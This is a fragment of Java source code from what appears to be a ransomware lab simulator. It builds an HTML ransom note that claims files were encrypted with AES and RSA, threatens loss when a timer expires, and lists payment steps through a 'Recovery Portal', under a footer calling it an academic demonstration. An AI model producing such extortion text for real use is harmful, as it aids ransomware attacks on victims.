            new EmptyBorder(6, 18, 6, 18)
        ));
        btn.setFocusPainted(false);
        btn.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
    }

    private String buildFaqHtml() {
        return "<html><body style='font-family:sans-serif; color:#222; padding:10px 14px; font-size:12px; line-height:1.4;'>" +
            "<h2 style='color:#900; margin:0 0 6px 0; font-size:16px;'>What Happened to My Computer?</h2>" +
            "<p>Your important demonstration files inside <b>Lab_sandbox</b> have been encrypted with military-grade hybrid cryptography: " +
            "<b>AES-256-GCM</b> for each file, and an asymmetric <b>RSA-4096</b> master key.</p>" +
            "<p>Photos, documents, spreadsheets, and databases are no longer accessible until decrypted. " +
            "Nobody can recover these files without the private decryption key held on the server.</p>" +

            "<h2 style='color:#900; margin:14px 0 6px 0; font-size:16px;'>Can I Recover My Files?</h2>" +
            "<p><b>Yes, guaranteed.</b> You can safely recover all your files once you obtain the corresponding Private Key from our Recovery Portal.</p>" +
            "<p>However, you have limited time. As the timer expires, key destruction will be simulated and recovery will become impossible.</p>" +

            "<h2 style='color:#900; margin:14px 0 6px 0; font-size:16px;'>How Do I Pay & Get My Key?</h2>" +
            "<ol style='margin-left:18px; padding-left:0;'>" +
            "  <li>Click <b>[Check Payment]</b> below to open the <b>Recovery Portal</b> in your web browser.</li>" +
            "  <li>Ensure your Recovery ID (<b>" + recoveryId + "</b>) is entered on the portal.</li>" +
            "  <li>Click the demo payment confirmation on the portal.</li>" +
            "  <li>Once confirmed, the portal will release and display your <b>Private Key</b>.</li>" +
            "  <li>Copy that key, paste it into the <b>Enter Private Key</b> box below, and click <b>[Decrypt]</b>.</li>" +
            "</ol>" +
            "<p style='color:#777; font-size:10px; margin-top:10px;'>[Lab Demonstration] Academic security research purposes only. No real harm is done.</p>" +
            "</body></html>";
    }
}